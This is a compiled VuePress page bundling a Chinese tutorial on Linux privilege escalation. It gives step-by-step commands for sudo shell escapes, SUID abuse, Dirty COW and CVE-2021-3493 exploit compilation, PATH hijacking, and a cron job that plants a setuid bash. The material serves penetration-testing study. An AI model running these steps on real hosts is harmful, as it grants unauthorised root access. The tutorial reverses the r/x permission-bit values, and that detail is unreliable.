import{_ as o,p,q as l,s,R as a,t,Z as n,n as c}from"./framework-47a2e622.js";const i="/images/微信图片_20220827003617.png",r="/images/微信图片_20220825162853.png",d="/images/微信图片_20220828145348.png",u="/images/微信图片_20220828151425.png",h="/images/微信图片_20220824231612.png",k="/images/微信图片_20220824231831.png",m="/images/微信图片_20220825172112.png",g="/images/微信图片_20220825172501.png",b="/images/微信图片_20220826133831.png",v="/images/微信图片_20220826134056.png",x="/images/微信图片_20220826135822.png",_="/images/微信图片_20220826140037.png",w="/images/微信图片_20220826141319.png",f="/images/微信图片_20220826141436.png",y="/images/微信图片_20220826163226.png",L="/images/微信图片_20220826163328.png",C="/images/微信图片_20220826163619.png",M="/images/微信图片_20220827000958.png",A="/images/微信图片_20220827001425.png",D="/images/微信图片_20220827002215.png",U={},q=n(`<h2 id="系统权限" tabindex="-1"><a class="header-anchor" href="#系统权限" aria-hidden="true">#</a> 系统权限</h2><blockquote><p>root [uid=0] &gt; 系统用户 [1&gt;=uid&gt;=499] &gt; 普通用户 [uid&gt;=500]</p></blockquote><h3 id="用户权限" tabindex="-1"><a class="header-anchor" href="#用户权限" aria-hidden="true">#</a> 用户权限</h3><p>在 Linux 中，有两种用户，一种是超级用户（<mark>root</mark>），一种是普通用户。超级用户可以在系统中做任何事情，不受限制，而普通用户往往只有某些特定的权限。超级用户的命令提示符是 <code>#</code>，普通用户是 <code>$</code>。</p><p>切换用户：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">su</span> user <span class="token comment"># 切换一般用户。</span>
<span class="token function">su</span> root <span class="token comment"># 切换 root 用户，root 可以省略。</span>
</code></pre></div><h3 id="文件权限" tabindex="-1"><a class="header-anchor" href="#文件权限" aria-hidden="true">#</a> 文件权限</h3><p>Linux 中文件的访问者有三种：</p><ul><li>拥有者 owner</li><li>所属组 group</li><li>其他 other</li></ul><p><img src="`+i+`" alt=""></p><p>其中前几位分别表示了文件的类型和访问权限。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>总用量 <span class="token number">44</span>
drwx------ <span class="token number">2</span> youzai     youzai     <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 test1
drwx------ <span class="token number">3</span> root       root       <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 test2
drwx------ <span class="token number">3</span> root       root       <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 systemd1
drwx------ <span class="token number">3</span> root       root       <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 systemd2
drwx------ <span class="token number">3</span> root       root       <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 systemd3
drwx------ <span class="token number">3</span> root       root       <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 systemd4
drwx------ <span class="token number">3</span> root       root       <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 systemd5
drwx------ <span class="token number">2</span> youzai     youzai     <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 admintest
drwx------ <span class="token number">2</span> Debian-gdm Debian-gdm <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 cc
drwxrwxrwt <span class="token number">2</span> root       root       <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 aa
drwx------ <span class="token number">2</span> root       root       <span class="token number">4096</span>  <span class="token number">8</span>月 <span class="token number">27</span> 00:33 test3
</code></pre></div><ul><li>第一位表示文件的类型 <ul><li><code>d</code> -&gt; 文件夹</li><li><code>-</code> -&gt; 普通文件</li><li><code>l</code> -&gt; 软链接（类似 Windows 的快捷方式）</li><li><code>b</code> -&gt; 块设备文件（例如硬盘、光驱等）</li><li><code>p</code> -&gt; 管道文件</li><li><code>c</code> -&gt; 字符设备文件（例如屏幕等串口设备）</li><li><code>s</code> -&gt; 套接口文件</li></ul></li><li>后九位中，前三位表示<mark>此文件的拥有者</mark>的权限，中间三位表示<mark>所属的组</mark>的权限，后三位表示<mark>其他人</mark>的权限 <ul><li><code>r</code> -&gt; 文件的读权限，二进制为 <strong>1</strong></li><li><code>w</code> -&gt; 文件的写权限，二进制为 <strong>2</strong></li><li><code>x</code> -&gt; 文件执行权限，二进制为 <strong>4</strong></li></ul></li></ul><p>修改文件权限：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">chmod</span> <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> 权限 文件名
</code></pre></div><p>用户符号：</p><ul><li><code>u</code> -&gt; 拥有者</li><li><code>g</code> -&gt; 拥有者同组用</li><li><code>o</code> -&gt; 其它用户</li><li><code>a</code> -&gt; 所有用户</li></ul><h2 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集" aria-hidden="true">#</a> 信息收集</h2><h3 id="版本信息" tabindex="-1"><a class="header-anchor" href="#版本信息" aria-hidden="true">#</a> 版本信息</h3><ul><li>获取当前操作系统版本信息</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">cat</span> /proc/version
<span class="token function">uname</span> <span class="token parameter variable">-a</span> <span class="token comment">#查看所有信息。</span>
<span class="token function">uname</span> <span class="token parameter variable">--help</span> <span class="token comment">#查看帮助。</span>
<span class="token function">uname</span> <span class="token parameter variable">-v</span> <span class="token comment">#查看内核版本。</span>
<span class="token function">uname</span> <span class="token parameter variable">-r</span> <span class="token comment">#查看内核发行号。</span>
</code></pre></div><ul><li>获取当前操作系统的发行版信息</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">cat</span> /etc/issue
<span class="token function">cat</span> /etc/*-release
<span class="token function">cat</span> /etc/lsb-release <span class="token comment"># Debian。</span>
<span class="token function">cat</span> /etc/redhat-release <span class="token comment"># Redhat。</span>
</code></pre></div><h3 id="漏洞信息" tabindex="-1"><a class="header-anchor" href="#漏洞信息" aria-hidden="true">#</a> 漏洞信息</h3>`,24),B={href:"https://github.com/mzet-/linux-exploit-suggester",target:"_blank",rel:"noopener noreferrer"},E={href:"https://github.com/sleventyeleven/linuxprivchecker",target:"_blank",rel:"noopener noreferrer"},S=s("p",null,"将脚本文件上传到目标后，执行脚本：",-1),V=s("div",{class:"language-bash","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[s("span",{class:"token function"},"bash"),a(` ./linux-exploit-suggester.sh
`)])])],-1),I=s("p",null,[s("img",{src:r,alt:""})],-1),H=s("div",{class:"custom-container warning"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8v4"}),s("path",{d:"M12 16h.01"})])]),s("p",{class:"custom-container-title"},"注意"),s("p",null,'出现提示："bash: ./test: cannot execute binary file"')],-1),j=n(`<ul><li>所执行的文件没有权限，需要添加权限</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">chmod</span> <span class="token number">777</span> <span class="token builtin class-name">test</span>
</code></pre></div><ul><li>32位和64位系统所需软件类型不同</li></ul><h2 id="sudo-提权" tabindex="-1"><a class="header-anchor" href="#sudo-提权" aria-hidden="true">#</a> SUDO 提权</h2><h3 id="原理" tabindex="-1"><a class="header-anchor" href="#原理" aria-hidden="true">#</a> 原理</h3><p>sudo 是 Linux 系统管理指令，是允许系统管理员让普通用户执行一些或者全部的 root 命令的一个工具，如 halt，reboot，su 等等。这样不仅减少了 root 用户的登录和管理时间，同样也提高了安全性。sudo 不是对 shell 的一个代替，它是面向每个命令的。sudo 可以使一般用户不需要知道超级用户的密码即可获得权限。</p><h3 id="复现" tabindex="-1"><a class="header-anchor" href="#复现" aria-hidden="true">#</a> 复现</h3><p>首先需要了解 sudoers 文件，这个文件对用户的 sudo 权限进行了说明和规范，文件主要由三部分组成：</p><ul><li>sudoers 的默认配置（default），主要设置sudo的一些缺省值。</li><li>alias（别名），主要有 Host_Alias | Runas_Alias | User_Alias | Cmnd_Alias。</li><li>安全策略（规则定义）。</li></ul><div class="language-ini" data-ext="ini"><pre class="language-ini"><code><span class="token key attr-name">root ALL</span><span class="token punctuation">=</span><span class="token value attr-value">(ALL) ALL</span>
</code></pre></div>`,10),P=s("div",{class:"custom-container info"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"说明"),s("p",null,"root 用户可以从 ALL 终端作为 ALL（任意）用户执行，并运行 ALL（任意）命令。")],-1),N=n(`<div class="language-ini" data-ext="ini"><pre class="language-ini"><code><span class="token key attr-name">touhid ALL</span><span class="token punctuation">=</span> <span class="token value attr-value">/sbin/poweroff</span>
</code></pre></div>`,1),T=s("div",{class:"custom-container info"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"说明"),s("p",null,"touchid 用户可以从任何终端使用 touhid 的用户密码关闭命令电源。")],-1),$=n(`<div class="language-ini" data-ext="ini"><pre class="language-ini"><code><span class="token key attr-name">touhid ALL</span> <span class="token punctuation">=</span> <span class="token value attr-value">(root) NOPASSWD: /usr/bin/find</span>
</code></pre></div>`,1),z=s("div",{class:"custom-container info"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"说明"),s("p",null,"用户 touchid 可以从任何终端运行，以 root 用户身份运行命令 find 而无需密码。")],-1),R=n(`<p>在 Linux 中，sudo 命令常用的参数：</p><ul><li><code>-V</code> -&gt; 显示版本编号。</li><li><code>-h</code> -&gt; 会显示版本编号及指令的使用方式说明。</li><li><code>-l</code> -&gt; 显示出自己（执行 sudo 的使用者）的权限。</li></ul><p>想要利用 sudo 用户，首先需要查看允许的命令：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token parameter variable">-l</span>
</code></pre></div><p><img src="`+d+`" alt=""></p><p>当发现可以用 sudo 调用的命令时，如 find 命令，可以用以下方式调用，达到提权目的：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">find</span> /etc/passwd <span class="token parameter variable">-exec</span> /bin/sh <span class="token punctuation">\\</span><span class="token punctuation">;</span>
<span class="token function">sudo</span> <span class="token function">find</span> /bin <span class="token parameter variable">-name</span> <span class="token function">nano</span> <span class="token parameter variable">-exec</span> /bin/sh <span class="token punctuation">\\</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>使用 vim 命令</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">vim</span> -c<span class="token string">&#39;!sh&#39;</span>
</code></pre></div><ul><li>使用 man 命令</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">man</span> <span class="token function">man</span>
</code></pre></div><ul><li>使用 awk 命令</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">awk</span><span class="token string">&#39;BEGIN {system（&quot;/bin/sh&quot;）}&#39;</span>
</code></pre></div><ul><li>使用 less / more 命令</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">less</span> /etc/hosts
<span class="token function">sudo</span> <span class="token function">more</span> /etc/hosts
</code></pre></div>`,15),O=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},[a("执行完命令后按下"),s("kbd",null,"!"),a("，之后按下"),s("kbd",null,"Enter"),a("。")])],-1),W=n('<p><img src="'+u+`" alt=""></p><h2 id="suid-提权" tabindex="-1"><a class="header-anchor" href="#suid-提权" aria-hidden="true">#</a> SUID 提权</h2><h3 id="原理-1" tabindex="-1"><a class="header-anchor" href="#原理-1" aria-hidden="true">#</a> 原理</h3><p>程序在运行的时候被赋予了 root 权限，是程序在运行过程中受到了 suid root 权限的执行过程导致。<code>chmod u+s</code> 赋予了 suid， <code>u-s</code>删除 suid。</p><h3 id="复现-1" tabindex="-1"><a class="header-anchor" href="#复现-1" aria-hidden="true">#</a> 复现</h3><p>Linux 提权一般上传至<code>/temp/</code>目录下，因为关机就会清空，且该目录一般具有读写权限。使用探针探测是否有 SUID，利用特定 SUID 进行提权。</p><p>可以用于产生shell的程序：</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><p>以下命令可以发现系统上运行的所有 SUID 可执行文件：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
<span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-ldb</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">\\</span><span class="token punctuation">;</span>
</code></pre></div><p><img src="`+h+`" alt=""></p><p>以 root 执行命令：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">touch</span> <span class="token builtin class-name">test</span>
<span class="token function">find</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-exec</span> <span class="token function">id</span> <span class="token punctuation">\\</span><span class="token punctuation">;</span>
</code></pre></div><p><img src="`+k+'" alt=""></p><h2 id="脏牛漏洞提权" tabindex="-1"><a class="header-anchor" href="#脏牛漏洞提权" aria-hidden="true">#</a> 脏牛漏洞提权</h2><h3 id="原理-2" tabindex="-1"><a class="header-anchor" href="#原理-2" aria-hidden="true">#</a> 原理</h3><p>脏牛（Dirty Cow）是 Linux 内核的一个提权漏洞，攻击者可以利用这个漏洞获取 root 权限。之所以叫 Dirty Cow，因为这个漏洞利用了 Linux 的 copy-on-write 机制。脏牛的 CVE 编号是 CVE-2016-5195。</p>',17),G=s("div",{class:"custom-container info"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"影响版本"),s("p",null,"以下是主流发行版修复之后的内核版本，如果你的内核版本低于列表里的版本，表示还存在脏牛漏洞。")],-1),X=n(`<div class="language-bash" data-ext="sh"><pre class="language-bash"><code>Centos7 /RHEL7    <span class="token number">3.10</span>.0-327.36.3.el7
Cetnos6/RHEL6     <span class="token number">2.6</span>.32-642.6.2.el6
Ubuntu <span class="token number">16.10</span>         <span class="token number">4.8</span>.0-26.28
Ubuntu <span class="token number">16.04</span>         <span class="token number">4.4</span>.0-45.66
Ubuntu <span class="token number">14.04</span>         <span class="token number">3.13</span>.0-100.147
Debian <span class="token number">8</span>                <span class="token number">3.16</span>.36-1+deb8u2
Debian <span class="token number">7</span>                <span class="token number">3.2</span>.82-1
</code></pre></div><h3 id="复现-2" tabindex="-1"><a class="header-anchor" href="#复现-2" aria-hidden="true">#</a> 复现</h3><blockquote><p>在漏洞的主机中上传漏洞检测脚本后，如果发现存在脏牛漏洞，则下载对应的 exp，并上传至目标主机进行利用。</p></blockquote><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> ./les.sh
</code></pre></div><p><img src="`+m+`" alt=""></p><p>通过链接下载对应的 exp 后，上传至服务器，并将 cpp 文件编译。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>g++ <span class="token parameter variable">-Wall</span> <span class="token parameter variable">-pedantic</span> <span class="token parameter variable">-O2</span> <span class="token parameter variable">-std</span><span class="token operator">=</span>c++11 <span class="token parameter variable">-pthread</span> <span class="token parameter variable">-o</span> dcow <span class="token number">40847</span>.cpp <span class="token parameter variable">-lutil</span>
./dcow <span class="token comment"># 执行文件，如果没有权限，则使用命令 chmod 777 dcow 添加对应的权限。</span>
</code></pre></div><p>成功拿到 root 权限。</p><p><img src="`+g+`" alt=""></p><h2 id="环境变量提权" tabindex="-1"><a class="header-anchor" href="#环境变量提权" aria-hidden="true">#</a> 环境变量提权</h2><h3 id="原理-3" tabindex="-1"><a class="header-anchor" href="#原理-3" aria-hidden="true">#</a> 原理</h3><blockquote><p>PATH 是 Linux 和类 Unix 操作系统中的环境变量，它指定存储所有可执行程序的所有 bin 和 sbin 目录。当用户在终端上运行任何命令时，它会请求 shell 在 PATH 变量的帮助下搜索可执行文件，以响应用户执行的命令。超级用户通常还具有 /sbin 和 /usr/sbin 条目，以便轻松执行系统管理命令。</p></blockquote><p>查看环境变量 $PATH：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
</code></pre></div><p><img src="`+b+'" alt=""></p>',15),Z=s("div",{class:"custom-container info"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"理解"),s("p",null,[a("在 Linux 中如果执行命令，系统会在这些路径下寻找是否存在这些命令对应的可执行文件，例如，输入 "),s("code",null,"cat"),a(" 命令后，系统会在 $PATH 的路径下去寻找该命令对应的执行文件。")])],-1),F=n('<div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">which</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span><span class="token variable">`</span></span>\n</code></pre></div><p><img src="'+v+`" alt=""></p><p>那么我们需要做的就是将路径修改，让系统首先在我们指定的目录下寻找命令对应的可执行文件，然后以 root 的身份执行该文件，即可达到提权的目的。</p><h3 id="复现-3" tabindex="-1"><a class="header-anchor" href="#复现-3" aria-hidden="true">#</a> 复现</h3><p>首先我们要以 root 身份创建一个文件，文件的目录假设为 /tmp，文件名为 shell.c，并将这个文件编译后输出为一个可执行的文件：</p><div class="language-c" data-ext="c"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">&quot;ps&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>将文件编译后输出：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>gcc shell.c <span class="token parameter variable">-o</span> shell
<span class="token function">chmod</span> u+s shell <span class="token comment"># 给 shell 文件赋予 SUID 权限。</span>
./shell <span class="token comment"># 执行该文件。</span>
</code></pre></div><p><img src="`+x+`" alt=""></p><p>当创建完成之后，我们发现该文件中使用了 system() 函数，该函数是继承环境变量的，因此便可以通过替换环境变量可以达到执行任意命令的效果。我们要做的就是替换 ps 所在的路径，并且修改 ps 这个命令可执行文件的内容，即自己创建一个 ps 文件。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token string">&quot;/bin/sh&quot;</span> <span class="token operator">&gt;</span> <span class="token function">ps</span> <span class="token comment"># ps 文件执行后将开启一个 shell。</span>
<span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span> <span class="token comment"># 给 ps 文件添加权限。</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span> <span class="token comment"># 将环境变量的路径前面加上 /tmp。</span>
</code></pre></div><p>这样，我们就完成了 ps 命令的伪造，当 ps 命令执行的时候，便会调用我们自己的命令，即以 root 执行 <code>/bin/sh/</code>。</p><p>$PATH 变量修改前后的变化：</p><p><img src="`+_+`" alt=""></p><p>该方法提权有几个前提：</p><ul><li>需要有 root 用户创建的可执行文件。</li><li>该文件执行的时候是以 SUID 的权限执行。</li></ul><p>可以使用命令查找具有这些特征的文件：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
</code></pre></div><p><img src="`+w+'" alt=""></p><p><img src="'+f+'" alt=""></p>',20),J=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"SUID"),s("p",null,"文件中的权限 s 是让普通用户可以以 root 用户的角色运行只有 root 帐号才能运行的程序或命令。")],-1),K=n('<h2 id="内核漏洞提权" tabindex="-1"><a class="header-anchor" href="#内核漏洞提权" aria-hidden="true">#</a> 内核漏洞提权</h2><h3 id="原理-4" tabindex="-1"><a class="header-anchor" href="#原理-4" aria-hidden="true">#</a> 原理</h3><p>Linux kernel 一般指 Linux 内核。Linux 是一种开源电脑操作系统内核。它是一个用 C 语言写成，符合 POSIX 标准的类 Unix 操作系统。可以利用 Linux 内核中存在的漏洞达到提权的目的。</p><h3 id="复现-4" tabindex="-1"><a class="header-anchor" href="#复现-4" aria-hidden="true">#</a> 复现</h3><blockquote><p>在渗透测试的过程中，可以借助信息收集查看系统的版本，结合版本信息查看是否存在可以利用的提权漏洞，这里用 CVE-2021-3493 漏洞为例。</p></blockquote><p>下载 Ubantu 对应版本：</p>',6),Q={href:"http://mirrors.aliyun.com/ubuntu-releases/16.04/",target:"_blank",rel:"noopener noreferrer"},Y=s("p",null,[s("img",{src:y,alt:""})],-1),ss=s("p",null,"使用 VMware 安装：",-1),as=s("p",null,[s("img",{src:L,alt:""})],-1),ns=s("p",null,"下载对应的 exp，编译执行：",-1),es={href:"https://github.com/briskets/CVE-2021-3493",target:"_blank",rel:"noopener noreferrer"},ts=n(`<div class="language-bash" data-ext="sh"><pre class="language-bash"><code>gcc exploit.c <span class="token parameter variable">-o</span> exploit
<span class="token function">chmod</span> +x exploit
./exploit
</code></pre></div><p><img src="`+C+`" alt=""></p><p>成功提升至 root 权限。</p><h2 id="计划任务提权" tabindex="-1"><a class="header-anchor" href="#计划任务提权" aria-hidden="true">#</a> 计划任务提权</h2><h3 id="原理-5" tabindex="-1"><a class="header-anchor" href="#原理-5" aria-hidden="true">#</a> 原理</h3><p>在 linux 系统中，执行周期的任务，可以使用 crontab。crontab 会把你指定的工作或任务，按照你设定的周期一直循环执行下去。cron 通常以 root 权限运行。如果我们可以成功修改 cron 中的任何脚本或二进制文件，那么我们可以使用 root 权限执行任意代码。</p><h3 id="复现-5" tabindex="-1"><a class="header-anchor" href="#复现-5" aria-hidden="true">#</a> 复现</h3><p>crontab 计划任务格式：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>* * * * * user <span class="token builtin class-name">command</span>
</code></pre></div><ul><li>第 1 列表示分钟 1～59，每分钟用 <code>*</code> 或者 <code>*/1</code> 表示。</li><li>第 2 列表示小时 1～23（0 表示 0 点）。</li><li>第 3 列表示日期 1～31。</li><li>第 4 列表示月份 1～12。</li><li>第 5 列表示星期 0～6（星期日用 0 或 7 表示）。</li><li>第 6 列表示以该用户的权限运行命令。</li><li>第 7 列要运行的命令。</li></ul><p>例如，想让服务器每一分钟执行一次脚本，可以使用如下命令：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 使用 vim /etc/crontab 编辑计划任务，加入以下任务。</span>
*/1 * * * * root python /tmp/cleanup.py
</code></pre></div><p>这样，服务器便会每分钟执行 /tmp 目录下的 cleanup.py 脚本。</p><p>首先需要一个 root 用户创建的可执行文件，如图中的 cleanup.py 脚本，并且该脚本以 SUID 权限运行。</p><p>查找服务器中的脚本文件：</p><p><img src="`+M+'" alt=""></p><p>查看计划任务：</p><p><img src="'+A+`" alt=""></p><p>编辑脚本文件，并将提权的命令写入其中：</p><div class="language-python" data-ext="py"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">try</span><span class="token punctuation">:</span>
  os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
  sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div>`,20),os=s("div",{class:"custom-container warning"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8v4"}),s("path",{d:"M12 16h.01"})])]),s("p",{class:"custom-container-title"},"无法编辑脚本文件"),s("p",null,[a("若无法编辑脚本文件，那么可能是权限不足，这时候可以使用 "),s("code",null,"sudo"),a(" 命令。")])],-1),ps=s("p",null,"等待计划任务执行后，脚本执行完成，便可以使用 /tmp 目录下的 bash 进行提权操作。",-1),ls=s("div",{class:"language-bash","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[a("/tmp/bash "),s("span",{class:"token parameter variable"},"-p"),a(`
`)])])],-1),cs=s("div",{class:"custom-container info"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"参数解释"),s("p",null,[a("当真实和有效的用户 id 不匹配时使用 "),s("code",null,"-p"),a("。禁用 $ENV 文件的处理和 shell 函数的导入。关闭此选项将导致有效 uid 和 gid 设置为实际 uid 和 gid。")])],-1),is=s("p",null,[s("img",{src:D,alt:""})],-1);function rs(ds,us){const e=c("ExternalLinkIcon");return p(),l("div",null,[q,s("ul",null,[s("li",null,[s("a",B,[a("https://github.com/mzet-/linux-exploit-suggester"),t(e)])]),s("li",null,[s("a",E,[a("https://github.com/sleventyeleven/linuxprivchecker"),t(e)])])]),S,V,I,H,j,P,N,T,$,z,R,O,W,G,X,Z,F,J,K,s("p",null,[s("a",Q,[a("http://mirrors.aliyun.com/ubuntu-releases/16.04/"),t(e)])]),Y,ss,as,ns,s("p",null,[s("a",es,[a("https://github.com/briskets/CVE-2021-3493"),t(e)])]),ts,os,ps,ls,cs,is])}const ks=o(U,[["render",rs],["__file","permissionEscalation.html.vue"]]);export{ks as default};
